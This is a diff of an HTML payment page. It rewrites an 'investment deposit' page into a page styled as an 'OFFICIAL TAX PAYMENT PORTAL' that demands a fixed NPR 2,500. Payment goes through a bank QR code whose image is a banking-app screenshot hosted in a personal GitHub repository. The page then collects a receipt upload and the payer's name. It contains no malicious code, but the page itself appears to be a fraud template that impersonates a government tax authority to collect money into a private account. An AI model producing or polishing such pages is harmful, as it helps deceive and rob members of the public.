@@ -2,137 +2,268 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
+<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Payment Process</title>
+<title>Tax Payment Portal</title>
 <style>
-:root{--bg:#f2f5f3;--card:#fff;--ink:#10231c;--mut:#5d6f67;--line:#dbe4df;--acc:#0e7a5a;--acc2:#e3b34a;--soft:#e6f4ee;
-box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
-@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#0c1511;--card:#14211b;--ink:#eaf3ee;--mut:#9bb0a6;--line:#25372f;--acc:#3ccf9b;--acc2:#e3b34a;--soft:#183328}}
-:root[data-theme="dark"]{--bg:#0c1511;--card:#14211b;--ink:#eaf3ee;--mut:#9bb0a6;--line:#25372f;--acc:#3ccf9b;--acc2:#e3b34a;--soft:#183328}
-html{scroll-padding-top:env(safe-area-inset-top,0px)}
+@import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
+
+:root{
+--bg:#f2f5f3;--card:#fff;--ink:#10231c;
+--mut:#64756d;--line:#dbe4df;
+--acc:#087b59;--soft:#e6f4ee;
+}
 *{box-sizing:border-box}
-body{margin:0;background:var(--bg);color:var(--ink);font-family:"Plus Jakarta Sans",system-ui,-apple-system,"Segoe UI",sans-serif;line-height:1.55}
-.wrap{max-width:960px;margin:0 auto;padding:32px 18px 56px}
+body{
+margin:0;background:var(--bg);color:var(--ink);
+font-family:'Plus Jakarta Sans',sans-serif;
+line-height:1.6;
+}
+.wrap{max-width:900px;margin:auto;padding:30px 18px 55px}
 header{text-align:center;margin-bottom:28px}
-.badge{display:inline-flex;gap:8px;align-items:center;background:var(--soft);color:var(--acc);padding:6px 14px;border-radius:99px;font-size:13px;font-weight:600}
-h1{font-size:clamp(30px,6vw,46px);margin:14px 0 8px;letter-spacing:-.02em;line-height:1.1}
-header p{color:var(--mut);margin:0 auto;max-width:520px}
+.badge{
+display:inline-block;background:var(--soft);
+color:var(--acc);padding:7px 15px;
+border-radius:30px;font-size:12px;font-weight:800;
+}
+h1{font-size:clamp(30px,6vw,43px);margin:15px 0 7px;letter-spacing:-1.5px}
+header p{color:var(--mut);max-width:520px;margin:auto;font-size:14px}
 .grid{display:grid;grid-template-columns:1fr 1fr;gap:20px}
-@media(max-width:760px){.grid{grid-template-columns:1fr}}
-.card{background:var(--card);border:1px solid var(--line);border-radius:22px;padding:24px}
-h2{font-size:19px;margin:0 0 16px}
-.qr{background:linear-gradient(160deg,var(--acc),#0a4d3a);border-radius:22px;padding:22px;text-align:center;color:#fff}
-.qrbox{background:#fff;border-radius:16px;padding:14px;width:min(100%,260px);aspect-ratio:1;margin:12px auto;display:flex;align-items:center;justify-content:center}
-.qrbox img{width:100%;height:100%;object-fit:contain;border-radius:8px}
-.qr small{opacity:.85}
+.card{background:var(--card);border:1px solid var(--line);border-radius:22px;padding:23px}
+@media(max-width:700px){
+.grid{grid-template-columns:1fr}
+.wrap{padding:24px 14px 40px}
+}
+.qr{
+background:linear-gradient(145deg,#087b59,#064b38);
+color:white;text-align:center;padding:22px;border-radius:22px;
+}
+.qr h2{margin:0;font-size:20px}
+.qrbox{
+background:white;border-radius:16px;padding:12px;
+width:min(100%,260px);aspect-ratio:1;
+margin:17px auto;display:flex;align-items:center;justify-content:center;
+}
+.qrbox img{width:100%;height:100%;object-fit:contain}
+.qr small{font-size:12px;opacity:.9}
+h2{font-size:19px;margin:0 0 15px}
+.amount{
+background:var(--soft);border:1px solid #c9e9d9;
+border-radius:17px;padding:17px;text-align:center;margin-bottom:20px;
+}
+.amount small{color:var(--mut);font-weight:600}
+.amount strong{display:block;font-size:34px;color:var(--acc);letter-spacing:-1px}
 .steps{list-style:none;padding:0;margin:0;counter-reset:s}
-.steps li{counter-increment:s;display:flex;gap:14px;padding:12px 0;border-bottom:1px solid var(--line)}
+.steps li{
+counter-increment:s;display:flex;gap:12px;
+padding:12px 0;border-bottom:1px solid var(--line);
+}
 .steps li:last-child{border:0}
-.steps li:before{content:counter(s);flex:none;width:28px;height:28px;border-radius:50%;background:var(--soft);color:var(--acc);font-weight:700;display:grid;place-items:center;font-size:14px}
-.steps b{display:block}.steps span{color:var(--mut);font-size:14px}
-.drop{display:block;border:2px dashed var(--line);border-radius:16px;padding:26px 16px;text-align:center;cursor:pointer;color:var(--mut);transition:.2s}
-.drop:hover,.drop:focus-within{border-color:var(--acc);background:var(--soft)}
-.drop input{position:absolute;opacity:0;width:1px;height:1px}
-.drop strong{color:var(--ink);display:block}
-#prev{display:none;max-width:100%;max-height:200px;border-radius:12px;margin:12px auto 0}
-label.f{display:block;font-size:14px;font-weight:600;margin:14px 0 6px}
-input.t{width:100%;padding:12px 14px;border-radius:12px;border:1px solid var(--line);background:var(--bg);color:var(--ink);font:inherit}
-input.t:focus{outline:2px solid var(--acc);outline-offset:1px}
-button.go{margin-top:18px;width:100%;padding:15px;border:0;border-radius:14px;background:var(--acc);color:#fff;font:inherit;font-weight:700;font-size:16px;cursor:pointer}
-button.go:hover{filter:brightness(1.08)}
-button.go:focus-visible{outline:3px solid var(--acc2);outline-offset:2px}
-.err{color:#d6453d;font-size:14px;margin:10px 0 0;min-height:20px}
-.note{display:flex;gap:10px;margin-top:20px;font-size:13px;color:var(--mut);justify-content:center;text-align:center}
-#done{display:none;text-align:center;max-width:520px;margin:0 auto}
-#done h2{font-size:28px;margin:18px 0 6px}
-#done p{color:var(--mut)}
-.tick{width:96px;height:96px;margin:auto}
-.tick circle{stroke:var(--acc);stroke-width:4;fill:var(--soft);stroke-dasharray:290;stroke-dashoffset:290;animation:d .6s ease forwards}
-.tick path{stroke:var(--acc);stroke-width:6;fill:none;stroke-linecap:round;stroke-linejoin:round;stroke-dasharray:60;stroke-dashoffset:60;animation:d .4s .5s ease forwards}
-@keyframes d{to{stroke-dashoffset:0}}
-.status{display:flex;align-items:center;gap:10px;justify-content:center;background:var(--soft);border-radius:14px;padding:14px;margin:20px 0;font-weight:600;color:var(--acc)}
-.pulse{width:10px;height:10px;border-radius:50%;background:var(--acc2);animation:p 1.2s infinite}
-@keyframes p{50%{opacity:.25}}
-@media(prefers-reduced-motion:reduce){*{animation-duration:.01s!important}}
+.steps li:before{
+content:counter(s);flex:none;width:28px;height:28px;
+border-radius:50%;background:var(--soft);color:var(--acc);
+font-weight:800;display:grid;place-items:center;font-size:13px;
+}
+.steps b{display:block;font-size:14px}
+.steps span{font-size:12px;color:var(--mut)}
+label.f{display:block;font-size:13px;font-weight:700;margin:15px 0 6px}
+input.t{
+width:100%;padding:13px;border:1px solid var(--line);
+border-radius:12px;background:var(--bg);color:var(--ink);
+font:inherit;outline:none;
+}
+input.t:focus{border-color:var(--acc);box-shadow:0 0 0 3px #087b591a}
+.drop{
+display:block;border:2px dashed var(--line);
+border-radius:16px;padding:22px;text-align:center;
+cursor:pointer;color:var(--mut);font-size:13px;
+}
+.drop:hover{border-color:var(--acc);background:var(--soft)}
+.drop input{display:none}
+.drop strong{display:block;color:var(--ink);margin:5px}
+#prev{display:none;max-width:100%;max-height:180px;border-radius:12px;margin:12px auto 0}
+.go{
+width:100%;padding:15px;border:0;border-radius:13px;
+background:var(--acc);color:white;font:inherit;
+font-size:15px;font-weight:800;cursor:pointer;margin-top:20px;
+transition:.2s;
+}
+.go:hover{filter:brightness(1.1);transform:translateY(-2px)}
+.err{color:#d6453d;font-size:13px;margin-top:10px;min-height:20px}
+.note{text-align:center;font-size:12px;color:var(--mut);margin-top:18px}
+#done{display:none;text-align:center;max-width:540px;margin:auto}
+.tick{width:85px;height:85px;margin:auto}
+.tick circle{stroke:var(--acc);stroke-width:4;fill:var(--soft)}
+.tick path{stroke:var(--acc);stroke-width:6;fill:none;stroke-linecap:round;stroke-linejoin:round}
+.status{
+background:var(--soft);color:var(--acc);padding:14px;
+border-radius:13px;margin:20px 0;font-weight:800;
+}
 </style>
 </head>
 <body>
+
 <div class="wrap">
+
 <header>
-  <span class="badge">🔒 Secure investment deposit</span>
-  <h1>Payment Process</h1>
-  <p>Deposit your investment amount in a few quick steps. Scan, pay, and send us your proof of payment.</p>
+<span class="badge">🏛️ OFFICIAL TAX PAYMENT PORTAL</span>
+<h1>Tax Payment</h1>
+<p>Complete your tax payment securely by scanning the bank QR code and submitting your payment confirmation.</p>
 </header>
 
 <main id="main">
-<div class="grid">
-  <section>
-    <div class="qr">
-      <h2 style="color:#fff;margin:0">Scan to pay</h2>
-      <div class="qrbox">
-        <!-- Replace the src below with your Bank QR Code image (e.g. "my-qr.png") -->
-        <img id="qrimg" alt="Bank QR code" src="https://raw.githubusercontent.com/Rupayy/Rupay/refs/heads/main/Screenshot_20260505_125434_MBL%20M-Smart.jpg">
-      </div>
-      <small>Your QR code image will appear here</small>
-    </div>
-  </section>
 
-  <section class="card">
-    <h2>How to deposit</h2>
-    <ol class="steps">
-      <li><div><b>Open your banking app</b><span>Use any app that supports QR payments.</span></div></li>
-      <li><div><b>Scan the QR code</b><span>Enter the amount you want to invest.</span></div></li>
-      <li><div><b>Take a screenshot</b><span>Save the successful payment confirmation.</span></div></li>
-      <li><div><b>Upload it below</b><span>We verify your deposit and activate your investment.</span></div></li>
-    </ol>
-  </section>
+<div class="amount">
+<small>FIXED TAX PAYMENT AMOUNT</small>
+<strong>NPR 2,500/-</strong>
+<small>Two Thousand Five Hundred Rupees Only</small>
+</div>
+
+<div class="grid">
+
+<section class="qr">
+<h2>Scan Bank QR to Pay</h2>
+<div class="qrbox">
+<img
+alt="Bank payment QR code"
+src="https://raw.githubusercontent.com/Rupayy/Rupay/refs/heads/main/Screenshot_20260505_125434_MBL%20M-Smart.jpg">
+</div>
+<small>Scan using your mobile banking app</small>
+</section>
+
+<section class="card">
+<h2>Payment Instructions</h2>
+<ol class="steps">
+<li><div>
+<b>Open your mobile banking</b>
+<span>Open your preferred banking application.</span>
+</div></li>
+<li><div>
+<b>Scan the bank QR code</b>
+<span>Scan the QR displayed on this page.</span>
+</div></li>
+<li><div>
+<b>Pay NPR 2,500</b>
+<span>Enter the exact required payment amount.</span>
+</div></li>
+<li><div>
+<b>Save payment receipt</b>
+<span>Take a screenshot after successful payment.</span>
+</div></li>
+<li><div>
+<b>Submit payment proof</b>
+<span>Upload your receipt using the form.</span>
+</div></li>
+</ol>
+</section>
 </div>
 
 <section class="card" style="margin-top:20px">
-  <h2>Send your payment screenshot</h2>
-  <label class="drop">
-    <input type="file" id="file" accept="image/*">
-    <span style="font-size:30px">📤</span>
-    <strong id="fname">Tap to upload your paid screenshot</strong>
-    PNG or JPG
-    <img id="prev" alt="Screenshot preview">
-  </label>
-  <label class="f" for="name">Full name</label>
-  <input class="t" id="name" placeholder="Your name" autocomplete="name">
-  <label class="f" for="amt">Amount paid</label>
-  <input class="t" id="amt" type="number" min="1" inputmode="decimal" placeholder="e.g. 500">
-  <div class="err" id="err" role="alert"></div>
-  <button class="go" id="submit">Submit payment proof</button>
-  <div class="note">🛡️ Your details are used only to confirm your deposit.</div>
+<h2>Submit Tax Payment Details</h2>
+
+<label class="drop">
+<input type="file" id="file" accept="image/*">
+<span style="font-size:30px">📤</span>
+<strong id="fname">Upload Payment Receipt</strong>
+PNG or JPG
+<img id="prev" alt="Payment receipt preview">
+</label>
+
+<label class="f" for="name">Full Name</label>
+<input class="t" id="name" placeholder="Enter your full name" autocomplete="name">
+
+<label class="f" for="ref">Transaction Reference (Optional)</label>
+<input class="t" id="ref" placeholder="Enter transaction ID">
+
+<div class="err" id="err" role="alert"></div>
+
+<button class="go" id="submit">
+Submit Tax Payment →
+</button>
+
+<div class="note">
+🔒 Your submitted details are used for payment verification.
+</div>
 </section>
+
 </main>
 
 <section class="card" id="done" aria-live="polite">
-  <svg class="tick" viewBox="0 0 100 100"><circle cx="50" cy="50" r="46" transform="rotate(-90 50 50)"/><path d="M30 52l14 14 27-30"/></svg>
-  <h2>Thanks for choosing us!</h2>
-  <p id="hello">Your payment proof has been received.</p>
-  <div class="status"><span class="pulse"></span>Waiting for confirmation</div>
-  <p>Our team will verify your deposit shortly. Once it's confirmed, we'll recognize you as an investor and activate your investment. You'll hear from us soon.</p>
+
+<svg class="tick" viewBox="0 0 100 100">
+<circle cx="50" cy="50" r="46"/>
+<path d="M30 52l14 14 27-30"/>
+</svg>
+
+<h2>Payment Details Submitted!</h2>
+
+<p id="hello">Your payment information has been submitted.</p>
+
+<div class="status">
+🟡 Payment Verification Pending
+</div>
+
+<p>
+Your tax payment details have been submitted for review.
+Please retain your original bank transaction receipt.
+</p>
+
+<p><b>Tax Amount: NPR 2,500/-</b></p>
+
 </section>
 </div>
 
 <script>
-var f=document.getElementById('file'),p=document.getElementById('prev'),e=document.getElementById('err');
-f.addEventListener('change',function(){
-  var x=f.files[0];if(!x)return;
-  document.getElementById('fname').textContent=x.name;
-  p.src=URL.createObjectURL(x);p.style.display='block';
+const file=document.getElementById('file');
+const preview=document.getElementById('prev');
+const error=document.getElementById('err');
+
+file.addEventListener('change',()=>{
+const selected=file.files[0];
+if(!selected)return;
+
+if(!selected.type.startsWith('image/')){
+error.textContent='Please select a valid image.';
+file.value='';
+return;
+}
+
+if(selected.size>5*1024*1024){
+error.textContent='Image must be smaller than 5MB.';
+file.value='';
+return;
+}
+
+error.textContent='';
+document.getElementById('fname').textContent=selected.name;
+preview.src=URL.createObjectURL(selected);
+preview.style.display='block';
 });
-document.getElementById('submit').addEventListener('click',function(){
-  var n=document.getElementById('name').value.trim(),a=document.getElementById('amt').value;
-  if(!f.files[0]){e.textContent='Please upload your payment screenshot.';return}
-  if(!n||!a){e.textContent='Please enter your name and the amount you paid.';return}
-  document.getElementById('hello').textContent='Thank you, '+n+'. Your payment proof of '+a+' has been received.';
-  document.getElementById('main').style.display='none';
-  document.getElementById('done').style.display='block';
-  window.scrollTo({top:0,behavior:'smooth'});
+
+document.getElementById('submit').addEventListener('click',()=>{
+
+const name=document.getElementById('name').value.trim();
+const transaction=document.getElementById('ref').value.trim();
+
+if(!file.files[0]){
+error.textContent='Please upload your payment receipt.';
+return;
+}
+
+if(!name){
+error.textContent='Please enter your full name.';
+return;
+}
+
+document.getElementById('hello').textContent=
+'Thank you, '+name+'. Your NPR 2,500 tax payment details have been submitted.';
+
+document.getElementById('main').style.display='none';
+document.getElementById('done').style.display='block';
+
+window.scrollTo({top:0,behavior:'smooth'});
 });
 </script>
+
 </body>
 </html>
